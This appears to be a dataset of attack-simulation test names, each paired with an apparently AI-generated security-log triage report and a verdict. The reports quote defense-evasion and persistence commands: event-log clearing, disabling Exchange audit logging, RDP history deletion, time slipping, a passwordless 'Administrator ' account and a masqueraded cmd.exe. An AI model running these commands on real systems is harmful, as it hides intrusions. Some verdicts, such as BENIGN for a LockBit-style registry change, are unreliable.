Malicious process Masquerading as LSM.exe,"To analyze the provided log entries, we need to examine indicators of suspicious or malicious activity such as unusual processes, command-line arguments, or attempts of privilege escalation.

1. **Security log entries** show repeated EventID 5379, which typically relates to user authentication attempts to retrieve credentials from Windows Credential Manager. However, all these attempts have a `ReturnCode` of `3221226021`, indicating a failure to retrieve credentials. These failures alone do not indicate malicious behavior as they can result from legitimate access attempts with misconfigurations or incorrect credentials.

2. **Sysmon log analysis**:
   - Multiple entries show that `wevtutil.exe` and `conhost.exe` processes were run by the user `SERVER002\\admin_test`. While `wevtutil.exe` is a legitimate Windows utility for managing Windows event logs, its usage can be linked to malicious activity when combined with scripts or remote execution tools to clear logs and hide traces.
   - The command `""cmd.exe"" /c copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe & C:\\lsm.exe /c echo data.003 > C:\\data.003.txt""` is particularly suspicious. It involves copying `cmd.exe` to `C:\\lsm.exe` and using it to execute further commands. This behavior is not typical for routine operations and may indicate an attempt to masquerade a command shell as another service (lsm.exe is a legitimate process related to the Local Session Manager).

3. **System log entries** reflect typical Windows Update activities, which include updates for Microsoft Defender Antivirus. This activity looks legitimate and routine.

4. **Other observations**: Regular system processes run by `NT AUTHORITY\\SYSTEM` and standard Microsoft services (e.g., `wuauclt.exe` for Windows Update) with no signs of tampering.

### Conclusion:

- The combination of copying `cmd.exe` to another location with a new name (`lsm.exe`) and using it to execute commands raises a significant red flag. This could potentially be an attempt to disguise command-line operations or establish persistence.
- The repeated `wevtutil.exe` usage should be further explored to ensure no log tampering or unauthorized access attempts.

### Resolution: **SUSPICIOUS** 

**Guidance**: 
- Conduct a deeper investigation into the context and purpose behind the `cmd.exe` and `lsm.exe` operations.
- Review the user `admin_test`'s activities and privileges, especially regarding why `wevtutil` was used frequently.
- Check for additional indicators of compromise or persistence mechanisms on the host.
- Ensure proper logging configurations are intact and no logs have been tampered with or cleared."
Flush Shimcache,"Upon reviewing the provided Windows event logs, here is an analysis based on potential indicators of suspicious or malicious activities:

1. **Security Log (Event ID: 4616)**:
   - The events indicate changes in the system time with process `svchost.exe`. The NTP server ""time.windows.com"" is referenced for time synchronization, which is standard behavior. These do not indicate any direct suspicious behavior but altering system time is something that should be monitored for context.

2. **Sysmon Logs**:
   - The frequent execution of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test` suggests potential enumeration or script execution that might be looking at event logs quickly. This behavior could be associated with IT administration tasks; however, repeated rapid execution across different process IDs might suggest automated activity (e.g., a script).
   - `whoami.exe` execution is commonly used for reconnaissance or security testing, particularly to check the current user context.
   - The `cmd.exe` command with `Rundll32.exe apphelp.dll,ShimFlushCache` is somewhat unusual but not directly suspicious. Rundll32 executions should be scrutinized further as they can be used to run malicious code.
   - Numerous executions of `MicrosoftEdgeUpdate.exe` and associated components appear to be legitimate software updating activities, given the consistent logging under `NT AUTHORITY\SYSTEM` with no unusual command-line arguments.

3. **System Logs**:
   - These logs predominantly show time changes, correlating with security log data, aligning with legitimate time synchronization. There's nothing explicitly malicious here.

4. **Application Logs**:
   - The entries show `edgeupdate` service stopping, which aligns with update-related activities (starting or stopping services during updates). 

### Assessment:
- Most activities in the logs represent typical administrative and update processes. However, the execution patterns of command-line utilities in rapid succession warrant an elevated level of scrutiny. They may point toward automated system administration or a potentially harmful script that requires further investigation.

### Conclusion and Resolution:
Given the provided logs, there are no definitive indicators of malicious activity, but the pattern of system utilities being executed in rapid succession is aberrant enough to demand further investigation.

- **Final Resolution**: **SUSPICIOUS** - Given the behavior described, a deeper investigation into the context and origin of these automated or scripted activities is recommended to either confirm innocence or identify potential misconfigurations or unauthorized activities."
Terminal Server Client Connection History Cleared,"Upon analyzing the provided Windows event logs, several events indicate potentially suspicious behavior, although there are no clear indicators of 100% malicious activity. Here's a detailed analysis:

1. **Frequent Use of Tools and Utilities:**
    - Numerous Sysmon logs indicate processes executed by the user ""SERVER002\\admin_test,"" such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe`. While it's common for administrators to use these utilities, their frequent and rapid usage could indicate scripted or automated actions.
    
2. **Registry Deletions:**
    - The command `cmd.exe /c reg delete ""HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default"" /va /f & reg delete ""HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers"" /f` executed by `cmd.exe` under the user ""SERVER002\\admin_test"" deletes registry entries related to Remote Desktop history (`Terminal Server Client\Default`). This action is unusual as it indicates potentially an attempt to remove traces or clear recently accessed Remote Desktop connections, which could be considered suspicious depending on the context and server usage policies.

3. **Edge Update Logs:**
    - Numerous events are related to Microsoft Edge Update processes, such as `MicrosoftEdgeUpdate.exe`, being executed under ""NT AUTHORITY\\SYSTEM."" This indicates an update or installation process which is typically normal for software updates but should be analyzed for frequency and timing to validate against known update cycles.

4. **Integrity Levels and System Authority Execution:**
    - Some processes, including `cmd.exe`, and `reg.exe`, are executed with High integrity level. More importantly, Edge update-related processes run under ""NT AUTHORITY\\SYSTEM,"" which is typical for services running at a system level but should be consistent with legitimate update schedules.
   
5. **Software Protection Platform Service:**
    - The logs show events from the Microsoft-Windows-Security-SPP (Software Protection Platform Service), which seems to confirm legitimate software checks. However, the unusual sequence in combination with the rest of the activity requires consideration.

**Assessment:**
- The combined use of administrative utilities and registry manipulation indicates unusual behavior for a typical user session, suggesting potential automation or scripted actions that could be associated with an attempted or underway compromise.
- The Microsoft Edge Update logging is consistent with legitimate updates; however, the timing could be worth cross-referencing against update schedules to rule out misuse.

**Conclusion and Guidance:**
- **Resolution**: SUSPICIOUS. 
- This activity needs further investigation, particularly focusing on the context and necessity of the commands run by ""SERVER002\\admin_test."" Review logs for similar behavior patterns from this and other accounts, and check for any known vulnerabilities that might account for these actions.
- Consider conducting a scan with endpoint security tools, checking for unauthorized access, and monitoring for unusual user behavior.
- Engage with the user or IT administrators to determine if these actions align with legitimate maintenance tasks or if they require further scrutiny."
Running DLL with .init extension and function,"### Detailed Analysis

**1. Windows PowerShell Log:**
- **HostApplication**: This field indicates that `rundll32.exe` is executing a DLL located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\_WT.init,krnl`. This is potentially suspicious as `rundll32.exe` is often used to execute DLLs from atypical locations, which can be indicative of malicious activity. Especially concerning is the use of the Temp directory, which is typically not a standard location for legitimate DLLs to be executed.
- **Repeated pattern**: Multiple entries depict the execution of PowerShell with the same `rundll32.exe` command indicating persistence or repetitive execution, common tactics in attacks.

**2. Sysmon Log:**
- **CMD and Rundll32.exe Invocation**: The creation of `cmd.exe` process with a command line executing `rundll32.exe` to load a DLL from the Temp directory, raises red flags for potential script execution or DLL injection.
- **Process Ancestry**: The parent-child relationships between `cmd.exe`, `rundll32.exe`, and other processes (like `conhost.exe`) suggest a chain initiated through script-based execution, again signaling potentially malicious automation.
- **User Context**: Most processes are executed under the `SERVER002\admin_test` account. If this is unauthorized or unexpected, it might indicate credential compromise or misuse.

**3. Sysmon Network Events:**
- Although not explicitly detailed in logs provided, the interaction of PowerShell through a network (like WSMan provider starting) in combination with the above aspects is uncommon for benign use cases.

**4. Application Log:**
- The Application log entry seems benign and doesn't contain indicators to suggest malicious activity. It primarily shows Software Protection Platform Service events.

**5. Security Log:**
- No significant entries present to analyze for authentication anomalies or privilege escalations.

### Assessment

- **Indicators of Compromise**: The use of `rundll32.exe` to execute a DLL from a temporary directory via a command line is a significant indicator. Combined with the PowerShell activity, there is a strong potential for unauthorized or malicious automation or persistence mechanism.

### Resolution

- **Resolution**: MALICIOUS

### Guidance on How to Proceed

1. **Containment**: Immediately disconnect the host from any networks to prevent further potential malicious activity or data exfiltration.
2. **Investigation**: Conduct a deeper forensic analysis of the system, targeting:
   - The DLL being executed by `rundll32.exe`
   - Scripts or other payloads executed by PowerShell
   - Unusual scheduled tasks, startup items, or registry modifications
3. **Remediation**: Consider cleaning or rebuilding the infected system, and ensure all security patches and protections are up to date.
4. **Monitoring & Review**: Strengthen monitoring for similar PowerShell and rundll32 activities across your network. Regularly review access to critical accounts like `admin_test`.
5. **Awareness & Training**: Educate users about phishing and malicious email threats to help prevent credential leaks that may lead to such compromises."
Execution from Compressed JScript File,"Based on my analysis of the provided Windows event logs, the following observations and findings were noted:

1. **Windows Update Activity:**
   - The System log entries for EventID 44, 43, and 19 indicate that there was a Windows Defender Antivirus security intelligence update (KB2267602, Version 1.419.626.0). These events are typical for a system that is actively maintaining its security posture by updating its antivirus definitions.

2. **Sysmon Log Insights:**
   - Several process creation events are logged (EventID 1 and EventID 5).
   - An unusually high number of `wevtutil.exe` and `conhost.exe` processes were created by the user `SERVER002\admin_test`, suggesting potential exploration or manipulation of event logs. While `wevtutil` is a legitimate tool to manage Windows event logs, its excessive use can sometimes indicate log tampering or reconnaissance activity.
   - The execution of `C:\Windows\System32\cmd.exe` with a command line referencing a JavaScript file located in a temporary directory (datajs.js) is suspicious. This could indicate the potential execution of a script-based payload, which is a common technique in malicious attacks.
   - The invocation of `wscript.exe` to execute a JavaScript file (`datajs.js`) is another potential indicator of script-based attack behavior. This script execution followed by the launch of `calc.exe` might be indicative of testing payloads or checking script execution results.

3. **Security Log Observations:**
   - The Security log entries (EventID 5379) show failed credential access attempts for a Microsoft Account. The consistent `ReturnCode` of `3221226021` suggests that the credentials were not valid or access was denied. These repeated attempts could potentially indicate automated attempts to access account information.

4. **Miscellaneous Executions:**
   - The execution of standard system binaries like `whoami.exe` and `hostname.exe` by the same `admin_test` user appears consistent with activities someone might use to gather system information, which can be typical in both administrative or reconnaissance tasks.

**Assessment and Conclusion:**
- The usage of `cmd.exe` to execute JavaScript files and the frequent launching of `wevtutil.exe` with no clear legitimate administrative context stands out as suspicious. Additionally, the failed attempts to access Microsoft Account credentials further add to this suspicion.
- While there are legitimate reasons for executing certain commands and processes, the behavior observed in these logs aligns with tactics commonly used in malicious activities, such as reconnaissance, script-based execution of potential payloads, and attempted credential harvesting.

**Resolution: SUSPICIOUS**
- Although the logs do not confirm a full breach or malicious activity, the observed behaviors are atypical and warrant further investigation to rule out any possible compromise.
  
**Guidance:**
- Conduct a thorough investigation of the `admin_test` account activities to determine any unauthorized access or execution.
- Review the contents of the suspicious JavaScript file at `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\temp_datajs.zip\datajs.js`.
- Consider isolating the machine for deeper forensic analysis to ensure no lingering backdoors or malware are present.
- Inform the security operations team or relevant stakeholders about these findings for proactive measures."
Office 365 - Exchange Audit Log Disabled,"### Analysis of the Windows Event Logs

Upon reviewing the provided Windows event logs from various sources including PowerShell, Sysmon, and Security, there are notable entries that require analysis based on suspicious behavior or potential indicators of compromise. Below is the detailed analysis:

#### Windows PowerShell Logs

- The PowerShell logs indicate that a script was executed with the following command:
  ```powershell
  powershell.exe & {$secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force
  $creds = New-Object System.Management.Automation.PSCredential -ArgumentList """", $secure_pwd
  Connect-ExchangeOnline -Credential $creds
  Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False}
  ```
- Key points of interest:
  - Usage of `ConvertTo-SecureString` with `-AsPlainText -Force` is considered a poor security practice because it indicates that the password was set in plaintext.
  - The script attempts to connect to Exchange Online using credentials that are not specified, implying potential misuse of credentials.
  - Disabling unified audit log ingestion with `Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False` can hide administrative actions from audit logs, indicating potential malicious intent to avoid detection.

These aspects raise suspicion as they constitute improper security practices and imply a possible attempt to circumvent audit logging, which could be indicative of malicious activity.

#### Sysmon Logs

- The Sysmon logs show a series of processes executed by the user `SERVER002\admin_test`, including PowerShell, conhost.exe, and wevtutil.exe.
- Multiple instances of `conhost.exe` and `wevtutil.exe` are associated with the admin user:
  - While `conhost.exe` and `wevtutil.exe` are legitimate processes, their frequent, almost simultaneous execution alongside PowerShell raises suspicion, particularly without specific context as to their use.
- The execution of `whoami.exe` and `hostname.exe` is noted, which are not inherently malicious but can be used by attackers to gather system information.

#### Security Logs

- Logs indicate access searches (EventID 4798) and group memberships (EventID 4799) conducted by `CompatTelRunner.exe`, which checks group memberships possibly excessively or suspiciously.
- A `SYSTEM` logon (EventID 4624) and associated privileges (EventID 4672) confirm elevated activities by the process `services.exe`.

#### Conclusion

The collective analysis of the PowerShell scripts and Sysmon activity with processes like `wevtutil.exe` alongside security logs running unusually for `admin_test` suggests abnormal behavior. The disabling of audit logging, improper handling of credentials, and concurrent process activity lend credence to a potential security breach or at least a significant deviation from standard operating procedures with malicious implications.

### Assessment and Resolution

- **Resolution: SUSPICIOUS**

The Windows event logs reveal activity that appears suspicious due to the disabling of audit logging, insecure handling of credentials, and the tight concurrency of certain system processes. More rigorous investigation is necessary to conclusively determine if this activity is malicious or an anomaly as part of legitimate scripts used system maintenance. Immediate steps should include:
- Conducting a thorough access review and verifying any unauthorized changes.
- Enabling strict audit logging and revisiting administrative scripts for best security practices.
- Investigating the specific user accounts and privileges involved during the identified events.

Upon further investigation, if any unauthorized access or data manipulation is confirmed, resulting actions will need to escalate to treat it as a case of malicious activity."
Event Log Manipulations- Time slipping via Powershell,"Upon analysis of the provided Windows event logs, there are several entries that suggest potentially malicious activity centered around the execution of a PowerShell command to alter system time and create a log entry. Here are the pertinent observations:

1. **Sysmon Logs Analysis:**
   - There are repeated instances of `wevtutil.exe` and `conhost.exe` executions, which in isolation may not be suspicious but could be part of a larger context if associated with malicious activities.
   - A PowerShell command executed as `powershell.exe ""& {try{ , Set-Date -Date (Get-Date).AddDays(3), Add-Content \""""$env:APPDATA\slipDays.bak\"""" 3, }, catch {exit 1}}""` is noteworthy. This command attempts to change the system date and create a backfile (`slipDays.bak`), which could indicate malicious intent to manipulate timestamps, often used to hide the traces of malicious activity.

2. **Security and System Logs Analysis:**
   - Event ID 4616 in the security logs shows the system time was indeed altered by the PowerShell command. Time manipulation is typically suspicious, especially outside regular system maintenance windows, as it can be employed by adversaries to evade detection.
   - Process executed with elevated privileges include a variety of different Edge update processes. While these can be legitimate, the sheer volume and varied execution paths observed could be indicative of potentially unwanted software behaviors or an attempt to camouflage malicious activities.

3. **PowerShell Logs Analysis:**
   - The execution of the PowerShell command leading to system time alteration is recorded. This script alignment with the security events further corroborate suspicious activity.
   - The logs indicate that changes were recorded in the '\'System'\' time by a PowerShell script being executed by the user `SERVER002\admin_test`, showing the same PowerShell command recorded in Sysmon logs.

4. **Network and Application Logs Analysis:**
   - Network connections or other suspicious activities indicative of data exfiltration or other compromised behavior were not explicitly present in the logs provided but should be an area of concern given the suspicious time manipulation activities.

### Conclusion:
The manipulation of system time using PowerShell by the user `SERVER002\admin_test`, especially during what seems like an automated update cycle from other application logs, points towards either misuse by an internal user or potentially an exploit attempt using an improperly secured administrative account.

### Resolution:
- **SUSPICIOUS** - The activities observed are suspicious due to the time manipulation by PowerShell. Immediate further investigation is recommended to determine the intent, particularly examining user `admin_test` actions, associated accesses, and whether automated scripts have been tampered with. Specifically, it's crucial to verify whether an insider or malicious entity was attempting to cover tracks by altering system time.

### Guidance:
- Alert IT and security teams to review audit trails.
- Conduct a broader forensic analysis on the host.
- Analyze network logs for any external communication initiated post time change.
- Verify current security posture and any misuse of administrative privileges.
- Ensure endpoint protection and security logs are up to date and continuously monitored."
Grant Full Access to folder for Everyone - Ryuk Ransomware Style,"Upon analyzing the provided Windows event logs, several key points and potential issues arise:

1. **Frequent Execution of System Utilities**: The Sysmon logs indicate frequent executions of utilities such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe`. These utilities can be used for typical administrative tasks, but high-frequency usage, especially in a short period, could suggest potential malware behavior attempting to gather system information or manipulate logs.

2. **Alteration of File Permissions**: The Sysmon log shows a `cmd.exe` process executing the command `icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q`, which recursively grants full control permissions to all users on files in the Users/Public directory. This is often a red flag as it could indicate an attempt to facilitate further access or malware infection.

3. **Microsoft Edge Update Activities**: Numerous entries concerning the Microsoft Edge Update are present, which might indicate a legitimate update process. However, the extent and frequency of execution need further verification to rule out any potential misuse by malware masquerading as a benign update.

4. **Security Log Event**: The few events recorded in the Security Log (EventID: 4616) relate to time change operations. These events by themselves don't indicate an immediate security threat. However, time manipulation can sometimes be a part of an attempt to disrupt log timelines.

5. **Time Zone and Time Synchronization**: The System logs record events related to time zone biases and synchronization with a time source (time.windows.com). These entries align with standard time service operations and do not immediately suggest malicious activity.

After reviewing the logs and considering the outlined potential indicators, here is the assessment and suggested resolution:

- The presence of numerous executions of system utilities and the change of permissions in particular could suggest some suspicious behavior, especially the appropriations made to the `C:\Users\Public\` directory.
  
- Without further context or correlation with other logs or known threats, it is challenging to definitively label the activity as malicious.

**Assessment and Resolution**: Based on the given data, the resolution is **SUSPICIOUS**. The suspicious behavior observed, notably the use of `icacls` for permission modification and the intensive use of administrative utilities, warrants further investigation. It is advisable to:

- Verify the legitimacy of the process activities, particularly those involving the `icacls` command, and confirm that they correspond with sanctioned administrative tasks.
- Further analyze the tasks and parent processes related to system utilities execution to rule out any compromise.
- Correlate these log entries with other threat intelligence sources or logs for any known indicators of compromise.
- Consider deploying additional monitoring on the Windows host for similar activities in the future.

This resolution calls for deeper investigation, potentially including forensic analysis of the system in question."
Activate Windows NoTrayContextMenu Group Policy Feature,"Upon analyzing the provided logs, the following points stand out:

1. **Usage of System Utilities:**
   - Several instances of `wevtutil.exe` and `conhost.exe` were executed by the user `SERVER002\\admin_test`. While the `wevtutil.exe` tool is used for event log manipulation, its frequent usage without more context (e.g., specific command-line arguments indicating log exports or clears) can be seen as suspicious in some cases, especially if it's used to clear logs.

2. **Registry Modification:**
   - There is a notable execution of `cmd.exe` with a command to modify the registry key `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` to add the value `NoTrayContextMenu`. This action restricts the user's ability to interact with the system tray, which can be viewed as a malicious attempt to hide malicious software or activities from the user.

3. **Process Creation Events:**
   - Execution of utilities such as `hostname.exe` and `whoami.exe` might be used for system reconnaissance, indicating that someone might be investigating the environment.
   
4. **Frequent Execution of Microsoft Edge Update:**
   - Numerous executions of `MicrosoftEdgeUpdate.exe` and its components appear legitimate, as they are associated with updating Microsoft Edge. However, these updates are consistently run with `NT AUTHORITY\SYSTEM` privileges, which is expected for system updates.

5. **Time Change Events:**
   - The system time was adjusted and recorded in the logs, which is typically a benign system operation needed for time synchronization. However, time manipulation can be used to cover tracks in investigations.

**Assessment:**
The activity recorded in the logs shows some unusual system utility usage by `SERVER002\\admin_test`, particularly the registry modification which is a commonly-used persistence mechanism in attacks. The rest of the activities, including Microsoft Edge updates, appear to be regular and expected system operations.

**Resolution: SUSPICIOUS**

**Guidance:**
1. **Investigate the Purpose of Registry Changes:**
   - Review the need and authorization for making the registry change that prevents the context menu in the system tray, checking if it aligns with any expected administrative tasks.

2. **Review User Activities:**
   - Confirm if activities involving utilities like `wevtutil.exe` and `conhost.exe` fall within the user’s expected duties. If not, consider why these actions were performed, potentially querying the user `admin_test`.
   
3. **Continuous Monitoring:**
   - Implement enhanced monitoring for further suspicious activity involving `wevtutil.exe`, `conhost.exe`, and any registry changes to detect patterns indicative of further compromise attempts.

4. **Log Analysis for Anomalies:**
   - Scrutinize other system logs for potential indicators of compromise or suspicious access patterns that might correlate with the identified activity.

By taking these steps, you can ensure any potential malicious actions are detected early and mitigated accordingly."
Uninstall Crowdstrike Falcon on Windows,"After a comprehensive analysis of the provided Windows event logs, here is a detailed assessment:

### Indicators of Malicious Activity:

1. **Security Log Analysis:**
   - **Event 4672: Special Privileges Assigned:** The SYSTEM account obtaining a range of privileges such as `SeDebugPrivilege` can be expected but should be monitored if uncertain processes or accounts are granted these privileges.
   - **Event 5379: Credential Access Events:** Continuous attempts (several 5379 events) to access credentials related to `MicrosoftAccount` without success, which indicates failed attempts (ReturnCode: 3221226021).

2. **Sysmon Log Analysis:**
   - **Use of PowerShell (Event ID 1):** A PowerShell command attempts to execute CrowdStrike-related commands including uninstall aspects, which may indicate tampering or anti-forensic activities.
   - **Frequent Use of Wevtutil (Event ID 5):** Several instances of `wevtutil.exe` executed by `admin_test`, a non-standard tool for regular users, which might indicate log tampering or attempts to clear logs.
   - **Process Execution Patterns:** There are multiple Hostname and Whoami commands executed that could be part of enumeration activity.

3. **Application and PowerShell Log:**
   - No explicit malicious entries found, but these should be cross-referenced against known activities and expected behavior.

4. **Unusual Use of Administrative Tools:**
   - Several instances of `conhost.exe` and `whoami.exe` executed by `admin_test` and the presence of services tasks while SYSTEM had a significant level of continuous activity without standard user initiation.

Given the evidence in the logs:

- **Elevated Privilege Events**: Numerous special privilege assignments and credential checks by SYSTEM users hint at a potential internal or misconfigured process issue.
- **Command Execution**: The presence of PowerShell scripts modifying security-related system components suggests potential tampering.

### Assessment:

Based on the indicators and events identified, there is evidence of suspicious behavior on the examined host tied to potential privilege misuse and unsuccessful credential access attempts. These could indicate a case of persistent threats trying to maintain or elevate access.

### Resolution:

**SUSPICIOUS** - The observed activities and patterns do not conclusively demonstrate a confirmed breach but are sufficiently unusual to warrant further investigation. It is advisable to:
- Review and verify all SYSTEM and administrative account activities during the logged period.
- Investigate the source and intent of the PowerShell commands targeting CrowdStrike components.
- Cross-validate with network logs to see if any unauthorized connections align with these activities.

### Guidance:
- Implement stricter monitoring on SYSTEM account activities and potentially automate alerts for similar behavioral patterns.
- Ensure that all endpoint security tools, especially those related to identity and credential protection, are correctly configured and actively monitored.
- Review access control policies, particularly around privileged accounts, to identify any potential misconfigurations or should consider implementing additional logging and alerting controls."
LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell,"To analyze the provided Windows event logs, let's break down different components:

### System Log
- **Time Adjustments:** Both logs show periodic time adjustments, which might suggest synchronization with an NTP server. It's consistent with normal system operations adjusting the clock.

### Windows PowerShell Log
- **PowerShell Usage:** There is a PowerShell command that modifies a registry key related to Windows OOBE (a setup experience). It uses `New-ItemProperty` to set a policy, `DisablePrivacyExperience`. This suggests a configuration change, which could be a legitimate administrative task. However, misuse of PowerShell for registry modifications without clear justification can sometimes lead to concerns about potential unwanted changes.

### Sysmon Log
- **WevtUtil Usage:** Multiple entries reference the use of `wevtutil.exe` (Windows Event Utility), typically used to manage event logs. The process was executed with user credentials `SERVER002\admin_test`, which suggests an administrative user. Legitimate but something to verify, especially if unseen in regular operations.
- **Hostname and WhoAmI Execution:** Commands like `hostname.exe` and `whoami.exe` are run frequently for process enumeration, often not of concern unless in abnormal context.
- **Microsoft Edge Update Activities:** Multiple entries illustrate the Microsoft Edge Update process, which is consistent with system update operations. No anomalous activity is immediately evident here apart from typical update procedures.

### Application Log
- **Edge Update:** Logs regarding starting and stopping of Edge Update services look standard, aligning with update activities.

### Security Log
- **Time Sync Events:** Security logs reflect time change events (Event ID 4616) resonating with system time change logs, suggesting synchronization.

### Assessment and Conclusion
- **Benign:** There is no concrete indicator of malicious activity. The logs suggest regular system maintenance and some administrative actions, particularly registry modification via PowerShell and updating Microsoft Edge, which typically do not indicate compromise.
  
### Final Resolution
Given the logs' contents:  
**BENIGN** - The activities observed are consistent with normal administrative and system operations, with no evident malicious behaviors. However, due diligence should always review PowerShell execution, and verify it's within the scope of expected administrative actions."
Delete System Logs Using Clear-EventLog,"**Analysis of Logs:**

Upon review of the logs from the Windows machine ""Server002,"" several key observations are noted:

1. **Time Manipulation:**
   - The logs reveal events relative to time changes. The Security log shows a change in the system time, which can be indicative of an attempt to obfuscate activities by modifying the timestamps. Such behaviors are often associated with malicious intent to cover tracks.

2. **Suspicious PowerShell Activity:**
   - A critical entry in the Windows PowerShell log shows an unusual command: `Get-EventLog -List | ForEach-Object {$_.Log}, $logs | ForEach-Object {Clear-EventLog -LogName $_ }, Get-EventLog -list`. This suggests the PowerShell script was used to enumerate and clear logs. Clearing event logs is a significant indicator of malicious activity as it may indicate an attempt to hide unauthorized actions.

3. **Process Execution:**
   - Multiple executions of PowerShell are observed, especially one with a High Integrity Level under the user SERVER002\admin_test without a clear legitimate purpose. The parent process for these activities is often `wsmprovhost.exe`, which is associated with hosting PowerShell sessions. This context could suggest misused remote management capabilities.

4. **Service Activity:**
   - The common 'edgeupdate' processes and services such as `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` reflect regular updates and installations. However, given the context of other suspicious activities, corroborating logs would be necessary to entirely rule out misuse.

**Assessment:**
- The presence of system time manipulation and PowerShell commands clearing event logs are strong indicators of attempts at obfuscation or removal of tracks from suspicious activities—typically associated with intrusion attempts or malicious actions. PowerShell activities indicate potential misuse for unauthorized actions.

**Resolution:**
- **MALICIOUS:** These indicators suggest intentional attempts to cover activities and possible unauthorized actions. Immediate actions should be taken to further investigate the compromise and sanitize the environment.

**Guidance:**
- Isolate the affected system to prevent further unauthorized activities.
- Conduct a full forensic analysis, focusing on extracted timeline and root cause, and identify what data or processes have been potentially compromised.
- Review and secure the credentials of user accounts involved in the activity, particularly SERVER002\admin_test.
- Apply patches and security updates, especially for third-party services like Microsoft Edge Update.
- Enhance monitoring and logging to detect similar future activities preemptively.

The focus should be on incident response to safeguard against further risks and secure the environment comprehensively."
Create an Administratoruser (with a space on the end),"Upon reviewing the provided Windows event logs, I have identified a sequence of events that suggest potentially malicious activity occurring on the host system ""Server002"". The analysis is centered around unusual process creation events and suspicious account activities.

### Indicators of Malicious Activity

1. **Suspicious Account Activity:**
   - A PowerShell command was executed to create a local user account named ""Administrator "" (with a trailing space) with no password. This is often an indicator of an attempted unauthorized account creation for persistence:
     - Sysmon Log (Event ID 1) shows `powershell.exe` being executed with the command `New-LocalUser -Name ""Administrator "" -NoPassword`.
     - Security logs confirm account creation and name changes for an account named ""Administrator "" by user ""admin_test"", with Event IDs like 4720 (User Account Created) and 4738 (User Account Changed).

2. **Time Change Events:**
   - Event ID 4616 in the Security log indicates a system time change. This could be an attempt to manipulate event timestamps to hinder forensic analysis.

3. **Unusual Use of Administrative Utilities:**
   - Frequent execution of system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` signal potential reconnaissance or attempts to manipulate the logging mechanisms. These were executed under the user ""SERVER002\\admin_test"".

4. **Integrity Level and Privilege Use:**
   - Many processes are running with ""High"" integrity level which suggests they have elevated privileges. This includes the execution of PowerShell and other utilities.
   
5. **EdgeUpdate Activity:**
   - Repeated execution of Microsoft Edge Update components can be benign if it aligns with update schedules, however, the heavy presence of execution in this short time frame, coupled with possibly unnecessary options like `/ping`, or residing in temporary directories, might indicate abuse for persistence or privilege escalation pathways.

### Assessment

Given the evidence from the logs that strongly indicate suspicious account creation and potential privilege escalation tactics (e.g., PowerShell script for user creation without a password), it is plausible to conclude that malicious activity has occurred.

### Resolution: MALICIOUS

### Recommended Actions:

1. **Immediate Containment:**
   - Disable the suspicious accounts detected, particularly the newly created ""Administrator "" account.
   - Isolate the affected system from the network to prevent further malicious interactions.

2. **Investigation and Forensic Analysis:**
   - Conduct a comprehensive forensic investigation on ""Server002"" to determine the extent of the compromise and identify any additional artifacts of the attacker’s activity.
   - Review and correlate with firewall and network logs to reconcile any exfiltration attempts.

3. **Patch and Update:**
   - Ensure all systems, especially ""Server002"", are patched with the latest security updates to safeguard against known vulnerabilities.

4. **Enhance Monitoring:**
   - Increase monitoring and alerting on PowerShell commands, user account creations, and high integrity level executions.
   - Implement stricter policies through Group Policy or endpoint security solutions to limit the execution of unauthorized PowerShell scripts and administrative tool usage.

5. **Security Awareness:**
   - Provide training for users, especially those with administrative privileges, to recognize and report suspicious activities."
Masquerade as a built-in system executable,"### Analysis of the Logs

#### Suspicious Activities:

1. **PowerShell Activities:**
   - The PowerShell logs indicate that a script was executed to compile and run a C# application (named `Test`) using `Add-Type` to write a class that outputs ""tweet, tweet"", and then saves this as an executable (`svchost.exe`) in the `C:\Windows\Temp` directory.
   - Typically, `svchost.exe` is a Windows process used to host services from DLL files. However, its presence in the `C:\Windows\Temp` directory as a standalone executable—especially generated from a script—indicates obfuscation or hiding attempts, which are common tactics in malicious activities.

2. **Sysmon Logs:**
   - The process execution log confirm that the `svchost.exe` was executed from `C:\Windows\Temp`, matching the compiled output from the PowerShell script. The process lineage shows `powershell.exe` as its parent.
   - Execution of `csc.exe` (C# Compiler) and `cvtres.exe` (Resource conversion utility) for compiling the suspicious script is logged, indicating a synthesis of code outside typical development environments.
   - System-level processes and other PowerShell invocations were noted, but do not appear to trigger or escalate beyond the creation and execution of the questionable executable.

3. **Security and System Logs:**
   - No specific anomalies are observed in Security or System logs within the provided dataset, other than a proposed update to Microsoft Defender Antivirus.

4. **Miscellaneous:**
   - Administrative privileges appear to be used (`user: SERVER002\admin_test`) during various activities, increasing the risk of compromise.
   - Execution of host-retrieval commands (`hostname.exe` and `whoami.exe`) are noted. If part of broader context or patterns, could indicate information gathering, but this alone isn't definitive.

### Assessment:

The logs present multiple red flags, primarily because of the PowerShell script's intent to compile and execute a program at runtime, concealing it under a name usually associated with a legitimate Windows process (`svchost.exe`). Such acts are typically indicative of either a prototype scripting exercise (unlikely in a production environment without sandboxing) or techniques used for malware deployment.

### Resolution: **MALICIOUS**

The activity highlighted in the logs points towards the creation and execution of a potentially malicious script or program. The use of PowerShell to compile and invoke executables, using disguise tactics (by mimicking system services), is a known strategy for obfuscating unauthorized behavior.

### Guidance and Next Steps:

1. **Immediate Isolation**: Quarantine Server002 to prevent potential spread or direct compromise to other systems.
   
2. **Further Investigation**:
   - Review the source of the PowerShell script. Attempt identification of the origin or delivery method (phishing, exploit, etc.).
   - Conduct a wider threat hunt across the network for similar patterns of activity or file presence.

3. **Remediation and Clean-Up**:
   - Remove the rogue `svchost.exe` from all locations.
   - Use Microsoft Defender or another reputable tool to conduct a thorough antivirus and antimalware sweep.
